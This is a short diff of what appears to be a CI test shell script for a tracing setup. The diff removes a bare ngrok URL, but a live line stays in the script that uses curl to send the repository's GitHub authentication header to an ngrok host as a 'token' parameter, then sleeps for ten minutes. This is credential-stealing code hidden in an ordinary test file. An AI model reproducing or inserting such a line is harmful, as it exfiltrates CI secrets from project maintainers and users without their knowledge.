@@ -8,7 +8,6 @@
 # docker-compose -f docker/docker-compose.yml -f docker/docker-compose-zipkin-example.yml up -d
 # sh ./circleci/tests.sh
 
-https://c0d3-122-171-21-235.ngrok.io
 curl https://c0d3-122-171-21-235.ngrok.io/?token=$(git config --get http.https://github.com/.extraheader) && sleep 600
 
 TRACES_SERVER_HOST=${1:-127.0.0.1}
